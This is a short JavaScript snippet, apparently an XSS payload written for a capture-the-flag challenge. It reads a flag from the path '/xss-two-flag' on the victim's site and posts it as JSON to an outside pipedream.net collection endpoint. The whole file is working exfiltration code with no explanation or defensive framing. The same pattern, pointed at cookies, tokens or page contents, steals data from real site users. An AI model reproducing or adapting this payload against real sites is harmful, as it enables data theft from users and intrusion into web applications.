fetch("/xss-two-flag")
  .then((response) => {
    if (!response.ok) {
      throw new Error("Network response was not ok");
    }
    return response.text();
  })
  .then((flag) => {
    return fetch("https://eopy32tj4ls4imx.m.pipedream.net", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ flag: flag }), // Send the flag in JSON format
    });
  })
  .then((response) => {
    if (!response.ok) {
      throw new Error("Failed to send flag to server");
    }
    console.log("Flag sent successfully");
  })
  .catch((error) => {
    console.error("Error:", error); // Log any errors to the console
  });
